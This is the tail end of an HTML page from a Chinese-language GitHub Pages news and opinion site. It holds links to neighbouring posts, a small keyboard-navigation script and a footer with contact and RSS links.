        <a href="https://nodebe4.github.io/oped2/2021-06-25/%E7%B0%A1%E5%96%AE%E4%BB%8B%E7%B4%B9%E7%99%BC%E5%B8%83-Medium-%E6%96%87%E7%AB%A0%E5%89%8D%E5%8F%AF%E4%BB%A5%E6%94%B9%E7%9A%84%E6%9D%B1%E8%A5%BF/">
          簡單介紹發布 Medium 文章前可以改的東西
        </a>
      </li>
    
    
      <li>
        <time>2021-06-07</time>
        <a href="https://nodebe4.github.io/oped2/2021-06-07/Intigriti-s-0521-XSS-%E6%8C%91%E6%88%B0%E8%A7%A3%E6%B3%95-%E9%99%90%E5%AE%9A%E5%AD%97%E5%85%83%E7%B5%84%E5%90%88%E7%A8%8B%E5%BC%8F%E7%A2%BC/">
          Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼
        </a>
      </li>
    
    
      <li>
        <time>2021-06-05</time>
        <a href="https://nodebe4.github.io/oped2/2021-06-05/%E6%9A%AB%E5%88%A5%E5%89%8D%E7%AB%AF-%E9%87%8D%E6%96%B0%E9%96%8B%E5%A7%8B/">
          暫別前端，重新開始
        </a>
      </li>
    
  </div>


  <hr>
  <div class="pagination">
    
      <span class="prev" >
          <a href="https://nodebe4.github.io/oped2/2021-06-17/%E7%89%B9%E6%9C%97%E6%99%AE%E5%AE%A3%E7%A7%B0%E5%8D%B3%E5%B0%86%E5%87%BA%E7%89%88%E5%9B%9E%E5%BF%86%E5%BD%95-%E5%87%BA%E7%89%88%E5%95%86%E5%88%99%E8%AF%B4%E6%B2%A1%E4%BA%BA%E6%84%BF%E6%84%8F%E6%83%B9%E8%BF%99%E9%BA%BB%E7%83%A6/">
            前一篇：特朗普宣称即将出版回忆录，出版商则说没人愿意惹这麻烦
          </a>
      </span>
    
    
      <span class="next" >
          <a href="https://nodebe4.github.io/oped2/2021-06-17/%E5%8D%95%E8%BA%AB%E6%97%B6%E4%BB%A3-%E4%B8%BA%E4%BB%80%E4%B9%88%E5%B9%B4%E8%BD%BB%E4%BA%BA%E4%B8%8D%E5%86%8D%E6%86%A7%E6%86%AC%E5%A9%9A%E5%A7%BB/">
            後一篇：单身时代：为什么年轻人不再憧憬婚姻？
          </a>
      </span>
    

    <script>
    /* post pagination keyboard shortcuts */
    document.body.onkeyup = function(e){
      if (e.keyCode == '37') { window.location = 'https://nodebe4.github.io/oped2/2021-06-17/%E7%89%B9%E6%9C%97%E6%99%AE%E5%AE%A3%E7%A7%B0%E5%8D%B3%E5%B0%86%E5%87%BA%E7%89%88%E5%9B%9E%E5%BF%86%E5%BD%95-%E5%87%BA%E7%89%88%E5%95%86%E5%88%99%E8%AF%B4%E6%B2%A1%E4%BA%BA%E6%84%BF%E6%84%8F%E6%83%B9%E8%BF%99%E9%BA%BB%E7%83%A6/'; } // left arrow key
      if (e.keyCode == '39') { window.location = 'https://nodebe4.github.io/oped2/2021-06-17/%E5%8D%95%E8%BA%AB%E6%97%B6%E4%BB%A3-%E4%B8%BA%E4%BB%80%E4%B9%88%E5%B9%B4%E8%BD%BB%E4%BA%BA%E4%B8%8D%E5%86%8D%E6%86%A7%E6%86%AC%E5%A9%9A%E5%A7%BB/'; } // right arrow key
      if (e.keyCode == '45') { window.location = 'https://nodebe4.github.io/oped2/2021-06-25/%E7%B0%A1%E5%96%AE%E4%BB%8B%E7%B4%B9%E7%99%BC%E5%B8%83-Medium-%E6%96%87%E7%AB%A0%E5%89%8D%E5%8F%AF%E4%BB%A5%E6%94%B9%E7%9A%84%E6%9D%B1%E8%A5%BF/'; } // insert key
      if (e.keyCode == '46') { window.location = 'https://nodebe4.github.io/oped2/2021-06-07/Intigriti-s-0521-XSS-%E6%8C%91%E6%88%B0%E8%A7%A3%E6%B3%95-%E9%99%90%E5%AE%9A%E5%AD%97%E5%85%83%E7%B5%84%E5%90%88%E7%A8%8B%E5%BC%8F%E7%A2%BC/'; } // delete key
    };
    </script>
    <link rel="stylesheet" type="text/css" href="/oped2/assets/css/fab.css" />

<div class="fab-wrapper">
  <div class="fab-wheel">
    
    
    
    <a class="fab-action fab-action-1" title="上一篇(热键 &#8594;)" href="https://nodebe4.github.io/oped2/2021-06-17/%E7%89%B9%E6%9C%97%E6%99%AE%E5%AE%A3%E7%A7%B0%E5%8D%B3%E5%B0%86%E5%87%BA%E7%89%88%E5%9B%9E%E5%BF%86%E5%BD%95-%E5%87%BA%E7%89%88%E5%95%86%E5%88%99%E8%AF%B4%E6%B2%A1%E4%BA%BA%E6%84%BF%E6%84%8F%E6%83%B9%E8%BF%99%E9%BA%BB%E7%83%A6/">
      <i>后</i>
    </a>
    
    
    <a class="fab-action fab-action-2" title="下一篇(热键 &#8592;)" href="https://nodebe4.github.io/oped2/2021-06-17/%E5%8D%95%E8%BA%AB%E6%97%B6%E4%BB%A3-%E4%B8%BA%E4%BB%80%E4%B9%88%E5%B9%B4%E8%BD%BB%E4%BA%BA%E4%B8%8D%E5%86%8D%E6%86%A7%E6%86%AC%E5%A9%9A%E5%A7%BB/">
      <i>前</i>
    </a>
    
    
    <a class="fab-action fab-action-3" title="<medium>上一篇(热键 ins)" href="https://nodebe4.github.io/oped2/2021-06-25/%E7%B0%A1%E5%96%AE%E4%BB%8B%E7%B4%B9%E7%99%BC%E5%B8%83-Medium-%E6%96%87%E7%AB%A0%E5%89%8D%E5%8F%AF%E4%BB%A5%E6%94%B9%E7%9A%84%E6%9D%B1%E8%A5%BF/">
      <i>左</i>
    </a>
    
    
    <a class="fab-action fab-action-4" title="<medium>下一篇(热键 del)" href="https://nodebe4.github.io/oped2/2021-06-07/Intigriti-s-0521-XSS-%E6%8C%91%E6%88%B0%E8%A7%A3%E6%B3%95-%E9%99%90%E5%AE%9A%E5%AD%97%E5%85%83%E7%B5%84%E5%90%88%E7%A8%8B%E5%BC%8F%E7%A2%BC/">
      <i>右</i>
    </a>
    
  </div>
</div>


  </div>


  

</article>

    </div>

    <div style="z-index:2;">
<script src="/oped2/assets/js/vanilla-back-to-top.min.js"></script>
<script>addBackToTop({
  diameter: 56,
  cornerOffset: 20, // px
  id: 'back-to-top',
  backgroundColor: '#ddd',
  textColor: 'red'
})</script>
</div>


    <div class="wrapper-footer" id="footer">
      <div class="container">
        <footer class="footer">
          <img width="200px" src="https://i.imgur.com/RinUcXm.png" alt="二维码分享本站"/>
<font size=2px>二维码分享本站</font>

<!-- Refer to https://codepen.io/ruandre/pen/howFi -->
<ul class="svg-icon">

  

  

  
  <li><a href="mailto:beauti4@protonmail.com" class="icon-8 email" title="Email"><svg viewBox="0 0 512 512"><path d="M101.3 141.6v228.9h0.3 308.4 0.8V141.6H101.3zM375.7 167.8l-119.7 91.5 -119.6-91.5H375.7zM127.6 194.1l64.1 49.1 -64.1 64.1V194.1zM127.8 344.2l84.9-84.9 43.2 33.1 43-32.9 84.7 84.7L127.8 344.2 127.8 344.2zM384.4 307.8l-64.4-64.4 64.4-49.3V307.8z"/></svg><!--[if lt IE 9]><em>Email</em><![endif]--></a></li>
  

  

  

  
  <li><a href="https://github.com/NodeBE4/oped2" class="icon-13 github" title="GitHub"><svg viewBox="0 0 512 512"><path d="M256 70.7c-102.6 0-185.9 83.2-185.9 185.9 0 82.1 53.3 151.8 127.1 176.4 9.3 1.7 12.3-4 12.3-8.9V389.4c-51.7 11.3-62.5-21.9-62.5-21.9 -8.4-21.5-20.6-27.2-20.6-27.2 -16.9-11.5 1.3-11.3 1.3-11.3 18.7 1.3 28.5 19.2 28.5 19.2 16.6 28.4 43.5 20.2 54.1 15.4 1.7-12 6.5-20.2 11.8-24.9 -41.3-4.7-84.7-20.6-84.7-91.9 0-20.3 7.3-36.9 19.2-49.9 -1.9-4.7-8.3-23.6 1.8-49.2 0 0 15.6-5 51.1 19.1 14.8-4.1 30.7-6.2 46.5-6.3 15.8 0.1 31.7 2.1 46.6 6.3 35.5-24 51.1-19.1 51.1-19.1 10.1 25.6 3.8 44.5 1.8 49.2 11.9 13 19.1 29.6 19.1 49.9 0 71.4-43.5 87.1-84.9 91.7 6.7 5.8 12.8 17.1 12.8 34.4 0 24.9 0 44.9 0 51 0 4.9 3 10.7 12.4 8.9 73.8-24.6 127-94.3 127-176.4C441.9 153.9 358.6 70.7 256 70.7z"/></svg><!--[if lt IE 9]><em>GitHub</em><![endif]--></a></li>
  

  

  

  

  

  
  <li><a href="/oped2/feed.xml" class="icon-21 rss" title="RSS"><svg viewBox="0 0 512 512"><path d="M201.8 347.2c0 20.3-16.5 36.8-36.8 36.8 -20.3 0-36.8-16.5-36.8-36.8s16.5-36.8 36.8-36.8C185.3 310.4 201.8 326.8 201.8 347.2zM128.2 204.7v54.5c68.5 0.7 124 56.3 124.7 124.7h54.5C306.7 285.3 226.9 205.4 128.2 204.7zM128.2 166.6c57.9 0.3 112.3 22.9 153.2 63.9 41 41 63.7 95.5 63.9 153.5h54.5c-0.3-149.9-121.7-271.4-271.6-271.9V166.6L128.2 166.6z"/></svg><!--[if lt IE 9]><em>RSS</em><![endif]--></a></li>
  

  

  

  

  

    
</ul>





<p><span style="color:blue">内容每小时更新一次.</span> Powered by <a href="https://github.com/AWEEKJ/kiko-now">Kiko Now</a> & <a href="https://github.com/gitalk/gitalk">Gitalk</a> & <a href="https://github.com/duty-machine/news">duty-machine</a>, 站务 <a href="https://be4.herokuapp.com">NodeBE4</a>（<span style="color:red">被墙</span>）</p>





        </footer>
      </div>
    </div>

    



  </body>
</html>
